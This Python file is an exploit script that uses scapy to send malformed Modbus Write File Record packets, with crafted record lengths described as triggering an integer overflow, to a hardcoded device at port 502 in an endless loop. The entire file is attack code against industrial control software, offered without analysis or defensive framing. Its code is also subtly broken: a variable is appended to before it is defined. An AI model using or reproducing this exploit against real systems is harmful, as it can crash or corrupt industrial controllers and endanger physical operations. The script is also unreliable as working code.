from scapy.all import *
load_contrib('modbus')
import time
import socket
import struct

def create_exploit_packet():
    # Modbus Write File Record header
    function_code = 0x15

    # First group
    reference_type_1 = 0x00
    file_number_1 = 0x0004
    record_number_1 = 0x0000
    record_length_1 = 0xfffe  # Trigger integer overflow

    record_length_2 = 0xfffb  # Cause bytes_processed to become 0
    
    # Append first group
    payload += struct.pack('>BHHH',
                           reference_type_1,
                           file_number_1,
                           record_number_1,
                           record_length_1)
    payload += b'\xFF'  # Minimum 1 bytes of data for the first group
    
    # Append second group
    payload += struct.pack('>H',
                           record_length_2)
    payload += b'\x7F\x00\x00\x00\x00\x00\x00\x00'  # Minimum 1 bytes of data for the second group

    # Calculate request_data_length
    request_data_length = 0x20  # Subtract function_code byte

    # Construct final payload with correct request_data_length
    final_payload = struct.pack('>BB', function_code, request_data_length) + payload[1:]
    
    return final_payload

exploit_packet = create_exploit_packet()

# Create a socket and connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.103.152.8", 502))   # IP and port
ss = StreamSocket(s, Raw)

try:
    while True:
        # Create Modbus TCP ADU with the exploit payload
        transaction_id = 1
        protocol_id = 0
        unit_id = 1
        length = len(exploit_packet) + 1  # +1 for the Unit Identifier
        
        modbus_tcp = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + exploit_packet
        
        # Send the packet and receive response
        ss.send(Raw(modbus_tcp))
        response = ss.recv()
        
        if response:
            print("Response received:")
            response.show()
        else:
            print("No response received")
        
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopped by user")
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()
    print("Connection closed")
